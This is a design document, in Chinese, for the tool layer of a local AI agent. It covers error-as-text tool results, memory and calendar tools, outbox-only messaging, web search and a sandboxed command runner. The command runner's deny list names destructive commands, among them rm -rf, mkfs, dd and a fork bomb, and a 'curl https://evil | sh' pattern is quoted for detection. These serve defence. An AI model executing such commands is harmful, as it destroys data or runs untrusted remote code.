# ⑥ 工具层：`joyczl-tools`

模型能「动手」的全部途径都在这里。这一层最重要的一条约定是：
**工具永远不返回 `Err`，失败是一段给模型读的文本。**

目录：`joy-rs/joyczl-tools/src/`（`lib.rs`、`handlers.rs`、`calendar.rs`、
`messages.rs`、`memory_admin.rs`、`web.rs`、`exec.rs`）。

## 6.1 三个类型与一条铁律

```rust
pub struct ToolCtx {                 // 工具能看见的环境（#[derive(Clone)]）
    pub facts: Facts, pub episodes: Episodes, pub chat: Chat,
    pub calendar: Calendar, pub home: PathBuf,
}

pub struct Tool {
    pub name: String, pub description: String, pub input_schema: Value,
    pub handler: Handler,   // Arc<dyn Fn(ToolCtx, Value) -> Pin<Box<dyn Future<Output = anyhow::Result<String>> + Send>> + Send + Sync>
}

pub struct ToolRegistry { tools: BTreeMap<String, Tool> }
```

`ToolRegistry::execute(ctx, name, args) -> String`（**签名里没有 `Result`**）：

```rust
未注册 → "Error: 没有叫 '{name}' 的工具。可用：{names}"
Ok(o)  → o
Err(e) → format!("Error: 执行 {name} 失败：{e}")
```

为什么这么设计：调用者是模型。给它一个异常，它只会看到「出错了」；给它一段
文本，它能读懂「缺少参数 'subject'」并自己改对再试一次。于是**参数校验、
业务失败、未注册的工具**统一都是文本。

两条由此派生的规矩：

- handler 里**不要**为了「优雅」把失败包装成 `Err`——`Err` 只留给真正的意外
  （IO/DB 崩了），可预期的失败（编号不存在、同名技能已存在）应当自己返回一句
  说清楚的话。
- 成功/失败的判定靠前缀 `Error:`（见 ⑤ 的 `ToolOutcome::ok()`）。

参数助手也是同一套语气：`require_str` 会说「缺少参数 'x'」「应该是字符串，
得到的是 …」「不能是空的」；`opt_u32` 会在给了负数时说清楚。

## 6.2 注册顺序：显式，不用宏也不用扫目录

`handlers.rs（build_default）` 按固定顺序 register 9 个工具：

```
save_note → forget_note → search_memory → list_memory → current_time
          → manage_memory → create_skill → create_event → list_events
          → send_message → search_web
```

显式的理由：**「这个工具为什么在」要一眼能查**。注册表 `BTreeMap` 按名字排序，
所以 `registry.names()` 是稳定的字母序（测试在断言它）。

`run_command` **不在这里**：它由 `app-server` 在 `settings.exec_enabled` 为真时
才追加（见 ⑨）。没开 `JOY_EXEC` 时模型连它的名字都看不见——这是「默认关」的实现
方式，不是在工具里判断开关。

## 6.3 记忆类四件套 + 时间

| 工具 | 参数 | 行为与输出要点 |
|---|---|---|
| `save_note` | `subject`, `content` | `facts.add(…, "user")` → 「已记住：**s** — c（存在 {home}/state.db 的 facts 表，可随时用 search_memory 找回）」——**如实交代落点**，防模型虚报「已同步到云端」 |
| `forget_note` | `subject` | `forget_subject` → 「已忘掉 N 条」/「没有关于「s」的记忆，无需删除。」 |
| `search_memory` | `query`, `top_k`(4) | 走两级 FTS（②）→ 空则「记忆里没有关于「q」的东西。」 |
| `list_memory` | `limit`(10) | `recent` → 空则「记忆还是空的。告诉 Joy 一些关于你的事，它就会记住。」 |
| `current_time` | 无 | 「现在是 YYYY-MM-DD HH:MM:SS（星期，UTC±hh:mm）」——**带星期与时区**，「30 分钟后」才有解 |

**为什么要写清落点**：模型会转述工具输出。写着「存在 .joy/state.db 的 facts 表」，
它就不会说「已同步到苹果日历」。

## 6.4 `manage_memory`：按编号改/删

参数 `action` + `id`（+ `content`）：

| action | 实现 | 输出 |
|---|---|---|
| `update_fact` | `facts.update(id, content)` → `bool` | 「已把第 N 条事实改成…」/「记忆里没有编号 N 的事实。先用 list_memory 确认编号。」 |
| `delete_fact` | `facts.delete(id)` | 「已删掉第 N 条事实。」/同款 |
| `delete_episode` | `episodes.delete(id)` | 「已删掉第 N 条情景记录。」/「没有编号 N 的情景记录。」 |
| 其它 | —— | 「不认识的 action 'x'。可选：update_fact / delete_fact / delete_episode。」 |

**按编号而不是按内容删**是刻意的：按内容删一次手滑就会误伤同主题的其它记忆；
编号来自 `list_memory`，模型与用户都在同一张表上说话。

## 6.5 `create_skill`：把工作流固化成过程记忆

参数 `name` / `description` / `body`。流程（`memory_admin.rs（create_skill）`）：

1. `name` 归一：`.to_lowercase().replace(' ', "-")`。
2. `is_slug(&name)` 校验（与 `joy skill install` / `update` **共用同一处**，
   见 ⑦）。
3. 目标 `<home>/skills/{name}/SKILL.md` **已存在就拒绝**——从不覆盖已有技能。
4. 拼 frontmatter：`---\nname: …\ndescription: …\n---\n\n{body}\n`，然后
   `parse_skill_text` 自检一遍（与 loader 同一套校验，写进去的东西必须读得出来）。
5. 落盘并回一句「它会在提到「{description}」这类消息时自动生效」。

**只在用户同意后调用**——这条规矩写在工具的 description 与 system prompt 里。
理由和 `update_soul` 同类：agent 自己批准自己写行为准则，是权限设计的漏洞。

## 6.6 `create_event` / `list_events`：幂等 + ICS

### 幂等

`Calendar::add` 用 `INSERT OR IGNORE … RETURNING …`，冲突（同一 `title` + 同一
`start`）返回 `Ok(None)`，工具据此回「事件「t」（s）已经存在，没有重复创建。」。
**幂等的实现全在那条 UNIQUE 索引上**，代码里没有「先查再插」。

### 时间处理

- `start` / `end` 解析成 `NaiveDateTime`，统一**分钟精度**
  （`format("%Y-%m-%dT%H:%M")`）。
- 没给 `end` → `start + 1 小时`。
- 解析不了 → 返回文本（不是 `Err`）：「create_event 至少需要 title 和 start
  （ISO 8601，如 2026-07-14T09:00）。请补全后重试。」

### ICS 落盘（`write_ics`）

```
BEGIN:VCALENDAR / VERSION:2.0 / PRODID:-//joyczl-agent//EN
BEGIN:VEVENT / SUMMARY:{title} / DTSTART:{紧凑时间} / DTEND:{…} / DESCRIPTION:{attendees} / END:VEVENT
END:VCALENDAR
```

写入策略：文件存在就 `replace("END:VCALENDAR\n", "")` 再追加新事件、最后补回
结尾行（即**保持 VCALENDAR 包裹的追加**，不是覆盖）。`dt()` 把
`2026-07-14T09:00` 压成 `20260714T090000`（16 字符时补秒位）。

### Apple Calendar 同步（opt-in）

`JOY_APPLE_CALENDAR=1`（且是 macOS）时走 `osascript`：

- 生成的 AppleScript **逐字段设日期**（先 day=1，再 year/month/day/hours/…）——
  直接从「1 月 31 日加一个月」那种月末溢出会炸。
- 目标日历名固定 `Joy`，不存在就建（`delay 1` 等它出现），拿不到就退回第一个
  可写日历。
- 失败 → 「…失败（{e}）—— 事件仍在本地日历。」；退出码非零时取 stderr 前 120
  字符并附上权限提示（系统设置 → 隐私与安全性 → 自动化）。

### `list_events`

`start`/`end` 可选（比日期部分），`limit` 默认 20 且 `clamp(1,100)`。
**空结果也要说清查过哪儿**：「没有找到事件{区间}。查过：Joy 的本地日历（只包含 Joy
自己创建的事件…）。」——「你日历上没安排」只有在说清查的是哪个日历时才是诚实的。

## 6.7 `send_message`：只写草稿，绝不发送

整个 handler 只有文件 IO，没有任何网络调用（模块 doc 明确写了这条 local-first
硬规矩）：

- `to` 逐字符净化：字母数字保留，其余换 `-`，取前 40 字符（防路径穿越）。
- 文件名 `{UTC 时间戳}-{safe_to}.txt`，落在 `<home>/outbox/`。
- 内容 `To: {to}\n\n{body}\n`。
- 输出：「给 {to} 的消息已放进 outbox（{path}）。**没有真的发送** —— 请到那里
  审阅后自己发。」

## 6.8 `search_web`：两个后端

选择后端只看一个条件（`tavily_key()` 依次读 `TAVILY_API_KEY` / `JOY_SEARCH_API_KEY`）：

**有 key → Tavily**：`POST https://api.tavily.com/search`，
`{api_key, query, max_results, include_answer:false}`，取 `results[]` 映射
`(title, content 截 400 字, url)`。失败**不回落 DDG**（有 key 的路径失败说明
那是已知坏后端，再赌一次没意义）。

**没 key → DuckDuckGo HTML 端点**（`https://html.duckduckgo.com/html/?q=…`）。
解析是**手写扫描**，不引 regex：

```
在 page[cursor..] 找 "result__a\"" 标记
  → find_attr_after(marker, "href")  取 href
  → find_link_text(marker)           取 <a> 内的文本，过 strip_html
  → 摘要：从标题之后找 "result__snippet\"" 再取文本（找不到留空，不硬凑）
  → DDG 把真实 URL 包在重定向里：href 里找 "uddg=" 到 "&" 或串尾，urldecode
  → cursor = 标题结束位置，继续
```

配套的小工具都是状态机/查表，没有依赖：`strip_html`（去标签 + 收集 `&…;` 实体
交给 `unescape_entity`，认不出的原样保留）、`urlencode`（RFC3986 未保留字符以外
全部 `%XX`，被 ⑨ 的 MCP 层复用）、`urldecode`。

**空结果的两种文案**（要区分「真没有」与「后端被反爬」）：无 key 且 DDG 空 →
提示去 tavily.com 领 key；有 key 且空 → 「No results found. Try a more specific
query.」。正常输出带引擎名：「Web results for 'q' (via duckduckgo): …」。

## 6.9 `run_command`：全项目权限最高的一件事

**默认关**（`JOY_EXEC=1` 才注册进工具表）。开了之后**三道闸门**，
`vet(command, policy) -> Result<(), String>` 按顺序过：

### 闸门 1：硬拒名单（不可配置）

`HARD_DENY` 是一串小写子串：`sudo `、`doas `、`mkfs`、`dd if=`、`dd of=`、
`shutdown`、`reboot`、`halt `、`:(){`（fork 炸弹）、`chmod -r 777 /`、
`chown -r /`、`> /dev/disk`、`> /dev/sd`、`diskutil erase`、`launchctl unload`、
`systemctl disable`、`rm -rf /*`、`rm -rf ~`、`rm -rf $home`、`eval $(`、
`history -c`。

再加一个**手写的「下载进 shell」识别**（`pipes_into_a_shell`）：

```
按 '|' 切段 → 看相邻两段：
  左段 starts_with("curl") 或 ("wget")   → 「下载器」
  右段首个 token ∈ {sh, bash, zsh, dash, python, python3, perl, ruby} → 「shell」
两者同时成立 → 拒
```

为什么不能靠字面量：`curl https://evil | sh` 中间夹着 URL，`contains("curl | sh")`
永远匹配不到——而它正是最经典的「把陌生人的代码执行了」。

这一道**不可配置**：一个能被关掉的保险丝不是保险丝。

### 闸门 2：allowlist（默认拒绝）

`JOY_EXEC_ALLOW` 切出来的规则表。匹配规则（`matches_rule`）：

| 规则 | 匹配方式 |
|---|---|
| `*` | 全部放行（仍过不了闸门 1） |
| `cargo test*` | 前缀匹配 |
| `git status` | 整串相等 |

**空表 = 什么都不放行**，拒因会告诉用户怎么写第一条规则。不匹配时拒因也会带上
当前规则列表——模型据此能向用户解释「为什么没做」。

### 闸门 3：沙箱（不可用就拒绝执行）

这是本模块存在的理由：「为了跑通而裸跑一条命令」是绝不能发生的事，所以
**沙箱不可用 = 拒绝**，而不是降级执行。

「可用」是**测出来的**，不是查出来的（`sandbox_backend`，`OnceLock` 缓存）：

- `/usr/bin/sandbox-exec` 存在 → macOS seatbelt；
- 否则 `which("bwrap")` **且** `bubblewrap_runs()` → Linux bubblewrap；
- 否则 `None`。

`bubblewrap_runs()` 真的起一次 `bwrap … /bin/true`，参数形状与真实执行**一致**
（`--ro-bind / / --dev /dev --proc /proc --bind /tmp /tmp --die-with-parent`）。
原因：Ubuntu 24.04 用 AppArmor 限制了非特权用户命名空间，`bwrap` 装在那儿也会以
"setting up uid map: Permission denied" 失败。**只看「bwrap 在不在 PATH 里」就
放行，会让命令在沙箱没生效的情况下跑起来。**

### 沙箱怎么建（`sandbox_command`）

可写根集合先**规范化**（`canonicalize`）：macOS 上 `/var/folders/…` 是
`/private/var/folders/…` 的符号链接，seatbelt 认真实路径——用前者写规则，
允许的目录反而写不进去。

**macOS**：
```
(version 1)
(allow default)
(deny file-write*)                                  ← 先全禁写
(allow file-write* (subpath "{每个可写根}"))          ← 再逐个开回（SBPL 后规则覆盖前规则）
(allow file-write* (subpath "/tmp")) (…"/private/tmp") (…temp_dir)
→ /usr/bin/sandbox-exec -p {profile} /bin/sh -c {command}
```

**Linux**：
```
bwrap --ro-bind / / --dev /dev --proc /proc --bind /tmp /tmp --die-with-parent
      --bind {根} {根}… -- /bin/sh -c {command}
```

可写根由 handler 决定：`cwd`（参数里给了且是目录）或进程当前目录，**加上
`ctx.home`**（Joy 自己的状态如 outbox 住那儿）。

### 执行与汇报（`execute`，永不返回 `Err`）

- `stdin(null)`、`stdout/stderr(piped)`、`kill_on_drop(true)`。
- 超时用 `tokio::time::timeout` 包住「**并发**读两个管道 + `wait()`」：
  先读完 stdout 再读 stderr 会在 stderr 塞满管道时互相锁死。
- 超时 → 「命令超过 N 秒还没结束，已经掐掉。（要放宽就设 JOY_EXEC_TIMEOUT）」，
  `kill_on_drop` 收尾。
- 成功 → `"退出码 {code}\n{stdout}"`，stderr 非空再追加 `--- stderr ---` 段。
- 输出截断到 **8000 字符**并追加「…（输出太长，已截断）」——一条 `find /` 的输出
  能塞爆上下文，而模型需要知道「这不是全部」。

### 已知边界（写进 `docs/limitations.md`）

限制的是**写路径**不是网络；没有交互式批准弹窗（第三道闸门就是放行表）；
策略只在启动时读一次；硬拒名单是子串匹配，花哨的绕法抓不住——真正的防线是
放行表与沙箱。

## 6.10 测试

- `tools_tests.rs`：每个工具的行为与**文案**（落点是否如实、幂等、参数错误文本化、
  `create_skill` 拒绝重名与路径穿越）。
- `exec_tests.rs`：硬拒名单不可配置（含 `curl … | sh`）、空放行表全拒、
  规则匹配（整串/前缀）、沙箱要求是最后一道闸门、**放行的命令真的跑起来**、
  **沙箱真的拦住了允许根之外的写入**（写 `$HOME/probe` 必须失败）、被拒的命令
  不留副作用。

后两条在沙箱不可用的机器上**跳过**，跳过不是假装通过——「没沙箱就不跑」本身
也是被测的行为。
